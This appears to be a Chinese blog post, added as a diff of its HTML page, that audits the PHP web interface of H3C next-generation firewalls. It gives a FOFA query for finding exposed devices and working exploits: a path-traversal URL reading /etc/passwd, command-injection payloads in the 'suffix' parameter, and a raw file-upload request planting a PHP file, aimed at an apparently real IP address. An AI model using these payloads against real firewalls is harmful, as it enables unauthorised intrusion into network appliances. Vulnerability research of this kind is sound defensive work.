@@ -1,0 +1,805 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/q.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="咩咩羊">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="H3Cfofa: 1app&#x3D;&quot;H3C-下一代防火墙&quot; &amp;&amp; server&#x3D;&#x3D;&quot;lighttpd&#x2F;1.4.39&quot;  任意文件读取任意文件读取关键函数： 1file_get_contens、fopen、readfile  全局file_get_contens，主要看没有写死的  12345678910111213if( $get_url_para">
+<meta property="og:type" content="article">
+<meta property="og:title" content="H3C-下一代防火墙代码审计">
+<meta property="og:url" content="https://nocpeople.github.io/2024/11/08/H3C/index.html">
+<meta property="og:site_name" content="MieMieYang&#39;s Blog">
+<meta property="og:description" content="H3Cfofa: 1app&#x3D;&quot;H3C-下一代防火墙&quot; &amp;&amp; server&#x3D;&#x3D;&quot;lighttpd&#x2F;1.4.39&quot;  任意文件读取任意文件读取关键函数： 1file_get_contens、fopen、readfile  全局file_get_contens，主要看没有写死的  12345678910111213if( $get_url_para">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://nocpeople.github.io/2024/11/08/H3C/image-20241030000311-d2lmo0n.png">
+<meta property="og:image" content="https://nocpeople.github.io/2024/11/08/H3C/image-20241030000233-fxjyvep.png">
+<meta property="og:image" content="https://nocpeople.github.io/2024/11/08/H3C/image-20241030000505-11kcw12.png">
+<meta property="og:image" content="https://nocpeople.github.io/2024/11/08/H3C/image-20241031150745-r06xyqv.png">
+<meta property="og:image" content="https://nocpeople.github.io/2024/11/08/H3C/image-20241031161635-q6ufxkg.png">
+<meta property="og:image" content="https://nocpeople.github.io/2024/11/08/H3C/image-20241031161614-13u47uv.png">
+<meta property="og:image" content="https://nocpeople.github.io/2024/11/08/H3C/image-20241031162252-k1w1ybk.png">
+<meta property="og:image" content="https://nocpeople.github.io/2024/11/08/H3C/image-20241031165747-z9jkn1j.png">
+<meta property="og:image" content="https://nocpeople.github.io/2024/11/08/H3C/image-20241031165639-4d5yczv.png">
+<meta property="og:image" content="https://nocpeople.github.io/2024/11/08/H3C/image-20241031171050-5ecxick.png">
+<meta property="og:image" content="https://nocpeople.github.io/2024/11/08/H3C/image-20241031232011-kzwwcc0.png">
+<meta property="og:image" content="https://nocpeople.github.io/2024/11/08/H3C/image-20241031232110-5hiy89k.png">
+<meta property="og:image" content="https://nocpeople.github.io/2024/11/08/H3C/image-20241101140528-q1mmuwd.png">
+<meta property="article:published_time" content="2024-11-08T14:13:00.490Z">
+<meta property="article:modified_time" content="2024-11-08T14:22:02.328Z">
+<meta property="article:author" content="咩咩羊">
+<meta property="article:tag" content="php代码审计">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://nocpeople.github.io/2024/11/08/H3C/image-20241030000311-d2lmo0n.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>H3C-下一代防火墙代码审计 - MieMieYang&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"nocpeople.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"GEFbZku0C1jJRivxyZz2u4kc-gzGzoHsz","app_key":"0ZPDhqUJ8umvAlbRHQmaTFaN","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>MieMieYang&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/th.jpeg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="H3C-下一代防火墙代码审计"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-11-08 22:13" pubdate>
+          2024年11月8日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          669 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          6 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">H3C-下一代防火墙代码审计</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2024年11月8日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="H3C"><a href="#H3C" class="headerlink" title="H3C"></a>H3C</h1><p>fofa:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">app=<span class="hljs-string">&quot;H3C-下一代防火墙&quot;</span> &amp;&amp; server==<span class="hljs-string">&quot;lighttpd/1.4.39&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h1><p>任意文件读取关键函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file_get_contens、fopen、readfile<br></code></pre></td></tr></table></figure>
+
+<p>全局file_get_contens，主要看没有写死的</p>
+<img src="/2024/11/08/H3C/image-20241030000311-d2lmo0n.png" srcset="/img/loading.gif" lazyload class="" title="image">
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-variable">$get_url_param</span> == <span class="hljs-string">&#x27;sys_dia_data_down&#x27;</span>)&#123;<br>	<span class="hljs-comment">// if($_POST[&#x27;file_name&#x27;]!=null) $param[&#x27;file_name&#x27;] = formatpost($_POST[&#x27;file_name&#x27;]);</span><br>	<span class="hljs-variable">$fname</span> = <span class="hljs-string">&quot;/mnt/&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file_name&#x27;</span>];<br>	<span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$fname</span>);<br>	<span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Pragma: public&quot;</span>);<br>	<span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Cache-Control: private&quot;</span>);<br>	<span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: text/plain&quot;</span>);<br>	<span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Accept-Ranges: bytes&quot;</span>);<br>	<span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-Length: &quot;</span> . <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>));<br>	<span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file_name&#x27;</span>] );<br>	<span class="hljs-title function_ invoke__">ob_clean</span>();<br>	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;<br>	<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure>
+
+<p>​<img src="/2024/11/08/H3C/image-20241030000233-fxjyvep.png" srcset="/img/loading.gif" lazyload class="" title="image">​</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/webui/?file_name=../../../../../etc/passwd&amp;g=sys_dia_data_down<br></code></pre></td></tr></table></figure>
+
+<p>​<img src="/2024/11/08/H3C/image-20241030000505-11kcw12.png" srcset="/img/loading.gif" lazyload class="" title="image">​</p>
+<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>关键函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">system、exec、call_user_func、shell_exec<br></code></pre></td></tr></table></figure>
+
+<p>​<img src="/2024/11/08/H3C/image-20241031150745-r06xyqv.png" srcset="/img/loading.gif" lazyload class="" title="image">​</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;rm &#x27;</span>.<span class="hljs-variable">$portal_catalog</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$type</span>.<span class="hljs-string">&#x27;/images/&#x27;</span>.<span class="hljs-variable">$type</span>.<span class="hljs-string">&#x27;*&#x27;</span>);<br><br>rm /usr/local/webui/auth/portal  | <span class="hljs-keyword">echo</span> <span class="hljs-number">4444</span> /usr/local/webui/auth/images/<span class="hljs-number">1</span>.txt ;|<span class="hljs-keyword">echo</span> <span class="hljs-number">4444</span>/usr/local/webui/auth/images/<span class="hljs-number">1</span>.txt;*<br><br></code></pre></td></tr></table></figure>
+
+<p>​<img src="/2024/11/08/H3C/image-20241031161635-q6ufxkg.png" srcset="/img/loading.gif" lazyload class="" title="image">​</p>
+<p>‍</p>
+<p>​<img src="/2024/11/08/H3C/image-20241031161614-13u47uv.png" srcset="/img/loading.gif" lazyload class="" title="image">​</p>
+<p>‍</p>
+<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>g&#x3D;<code>aaa_local_web_custom_auth_submit</code>​</p>
+<p>​<img src="/2024/11/08/H3C/image-20241031162252-k1w1ybk.png" srcset="/img/loading.gif" lazyload class="" title="image">​</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;cp /usr/local/webui/auth/images/&quot;</span>.<span class="hljs-variable">$newName</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-string">&quot;/mnt/portal_custom/images/&quot;</span>.<span class="hljs-variable">$newName</span>);<br></code></pre></td></tr></table></figure>
+
+<p>​<code>$suffx</code>​</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;suffix&#x27;</span>]!=<span class="hljs-literal">null</span>) <span class="hljs-variable">$suffix</span> = <span class="hljs-title function_ invoke__">formatget</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;suffix&#x27;</span>]);<br></code></pre></td></tr></table></figure>
+
+<p>​<code>$bakName</code>​  <code>$newName</code>​</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$newName</span> = <span class="hljs-string">&#x27;tmpPic&#x27;</span>.<span class="hljs-variable">$suffix</span>; <span class="hljs-comment">//预览用的</span><br><span class="hljs-variable">$bakName</span> = <span class="hljs-string">&#x27;tmpPic2&#x27;</span>.<span class="hljs-variable">$suffix</span>; <span class="hljs-comment">//替换main.jpg用的</span><br></code></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/webui/?g=aaa_local_web_custom_auth_submit&amp;suffix=||<span class="hljs-keyword">echo</span>$&#123;IFS&#125;`ls`|tee$&#123;IFS&#125;-a$&#123;IFS&#125;/usr/local/webui/auth/images/<span class="hljs-number">2</span>.txt;<br></code></pre></td></tr></table></figure>
+
+<p>​<img src="/2024/11/08/H3C/image-20241031165747-z9jkn1j.png" srcset="/img/loading.gif" lazyload class="" title="image">​</p>
+<p>​<img src="/2024/11/08/H3C/image-20241031165639-4d5yczv.png" srcset="/img/loading.gif" lazyload class="" title="image">​</p>
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="一-1"><a href="#一-1" class="headerlink" title="一"></a>一</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">move_uploaded_file</span>() <br></code></pre></td></tr></table></figure>
+
+<p>​<img src="/2024/11/08/H3C/image-20241031171050-5ecxick.png" srcset="/img/loading.gif" lazyload class="" title="image">​</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$get_url_param</span> == <span class="hljs-string">&#x27;aaa_local_web_preview&#x27;</span>)&#123;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]!=<span class="hljs-literal">null</span>) <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">formatget</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;suffix&#x27;</span>]!=<span class="hljs-literal">null</span>) <span class="hljs-variable">$suffix</span> = <span class="hljs-title function_ invoke__">formatget</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;suffix&#x27;</span>]);<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;webTitle&#x27;</span>]!=<span class="hljs-literal">null</span>) <span class="hljs-variable">$webTitle</span> = <span class="hljs-title function_ invoke__">formatget</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;webTitle&#x27;</span>]);<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wcmWord&#x27;</span>]!=<span class="hljs-literal">null</span>) <span class="hljs-variable">$wcmWord</span> = <span class="hljs-title function_ invoke__">formatget</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wcmWord&#x27;</span>]);<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;titleOnly&#x27;</span>]!=<span class="hljs-literal">null</span>) <span class="hljs-variable">$titleOnly</span> = <span class="hljs-title function_ invoke__">formatget</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;titleOnly&#x27;</span>]);<br><br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read&#x27;</span>]!=<span class="hljs-literal">null</span>) <span class="hljs-variable">$read</span> = <span class="hljs-title function_ invoke__">formatget</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read&#x27;</span>]);<br>	<span class="hljs-variable">$read</span> = (<span class="hljs-variable">$read</span>)?<span class="hljs-variable">$read</span>:<span class="hljs-number">0</span>;<br><br>	<span class="hljs-variable">$webTitle</span> = (<span class="hljs-variable">$webTitle</span>)?<span class="hljs-variable">$webTitle</span>:<span class="hljs-string">&quot;&quot;</span>;<br>	<span class="hljs-variable">$wcmWord</span> = (<span class="hljs-variable">$wcmWord</span>)?<span class="hljs-variable">$wcmWord</span>:<span class="hljs-string">&quot;&quot;</span>;<br><br>	<span class="hljs-variable">$webTitle</span> = <span class="hljs-title function_ invoke__">utf8format</span>(<span class="hljs-variable">$webTitle</span>);<br>	<span class="hljs-variable">$wcmWord</span> = <span class="hljs-title function_ invoke__">utf8format</span>(<span class="hljs-variable">$wcmWord</span>);<br><br>	<span class="hljs-comment">//已经预览过，不再进行上传图片动作，且不删除tmpPic文件</span><br>	<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$read</span>)&#123;<br>			<span class="hljs-keyword">if</span>((!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic.jpg&#x27;</span>))&amp;&amp;(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic.jpg&#x27;</span>))&amp;&amp;(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic.png&#x27;</span>))&amp;&amp;(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic.jpeg&#x27;</span>))&amp;&amp;(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic.gif&#x27;</span>))&amp;&amp;(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic&#x27;</span>)))&#123;<br>			<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$filename</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic&#x27;</span>.<span class="hljs-variable">$suffix</span>);<br>			<span class="hljs-variable">$preview_tip</span> = <span class="hljs-string">&#x27;上传文件过大，建议小于&#x27;</span>.<span class="hljs-variable">$size</span>.<span class="hljs-string">&#x27;MB&#x27;</span>;<br>			<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic&#x27;</span>.<span class="hljs-variable">$suffix</span>)&gt;<span class="hljs-variable">$bytesize</span>)&#123;<br>				<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic&#x27;</span>.<span class="hljs-variable">$suffix</span>);<br>				<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&#123;&quot;</span>;<br>				<span class="hljs-keyword">echo</span>				<span class="hljs-string">&quot;tip: &#x27;&quot;</span> . <span class="hljs-variable">$preview_tip</span> . <span class="hljs-string">&quot;&#x27;,\n&quot;</span>;<br>				<span class="hljs-keyword">echo</span>				<span class="hljs-string">&quot;msg: &#x27;&quot;</span> . <span class="hljs-variable">$msg</span> . <span class="hljs-string">&quot;&#x27;\n&quot;</span>;<br>				<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&#125;&quot;</span>;<br>				<span class="hljs-keyword">return</span>;<br>			&#125;<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /webui/index.php?g=aaa_local_web_preview&amp;name=a&amp;suffix=<span class="hljs-number">1</span>.php HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">219.145</span>.<span class="hljs-number">245.245</span>:<span class="hljs-number">8443</span><br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXXX<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10_14_3</span>) AppleWebKit/<span class="hljs-number">605.1</span>.<span class="hljs-number">15</span> (KHTML, like Gecko) Version/<span class="hljs-number">12.0</span>.<span class="hljs-number">3</span> Safari/<span class="hljs-number">605.1</span>.<span class="hljs-number">15</span><br>Content-Length: <span class="hljs-number">140</span><br><br>------WebKitFormBoundaryXXX<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;a&quot;</span>; filename=<span class="hljs-string">&quot;1.php&quot;</span><br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br>------WebKitFormBoundaryXXX<br></code></pre></td></tr></table></figure>
+
+<p>​<img src="/2024/11/08/H3C/image-20241031232011-kzwwcc0.png" srcset="/img/loading.gif" lazyload class="" title="image">​</p>
+<p>​<img src="/2024/11/08/H3C/image-20241031232110-5hiy89k.png" srcset="/img/loading.gif" lazyload class="" title="image">​</p>
+<h2 id="二-1"><a href="#二-1" class="headerlink" title="二"></a>二</h2><p>​<img src="/2024/11/08/H3C/image-20241101140528-q1mmuwd.png" srcset="/img/loading.gif" lazyload class="" title="image">​</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-variable">$get_url_param</span> == <span class="hljs-string">&#x27;local_cert_delete_both&#x27;</span>)&#123;<br><span class="hljs-comment">/*get value from url*/</span><br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-variable">$params</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-title function_ invoke__">formatget</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>	<span class="hljs-variable">$params</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$params</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>	<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt;<span class="hljs-variable">$value</span>)&#123;<br>		<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;cert_file_name&#x27;</span>] = <span class="hljs-variable">$value</span>;<br>		<span class="hljs-variable">$rspString</span> = <span class="hljs-title function_ invoke__">getResponse</span>( <span class="hljs-variable">$module_name</span>, <span class="hljs-string">&quot;del&quot;</span> , <span class="hljs-variable">$param</span>, <span class="hljs-variable">$get_url_param</span> );<br>	&#125;<br>	<span class="hljs-comment">/*display message*/</span><br>	<span class="hljs-title function_ invoke__">showSuccess</span>(<span class="hljs-string">&#x27;local_cert_show&#x27;</span>);<br>	<span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
